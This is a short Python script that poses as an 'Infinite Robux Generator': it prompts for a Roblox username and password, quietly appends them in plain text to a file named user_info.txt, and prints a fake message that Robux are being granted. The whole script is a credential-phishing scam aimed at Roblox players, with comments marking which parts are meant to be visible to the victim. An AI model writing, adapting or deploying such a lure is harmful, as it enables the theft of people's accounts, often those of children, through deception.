def saveInfo(username, password):
    # Saves user info to a text file
    with open('user_info.txt', 'a') as file:
        file.write(f"Username: {username}, Password: {password}\n")

def robux():
    # Visible Robux giving print
    print("Giving", username, robuxAmount, "Robux!")

# Visible to User
print(" !?  Infinite Robux Generator  !?")
robuxAmount = input("$ Amount of Robux $: ")
username = input("/ Username /: ")
password = input("< Password >: ")

# Call saveInfo to save user info
saveInfo(username, password)

robux()
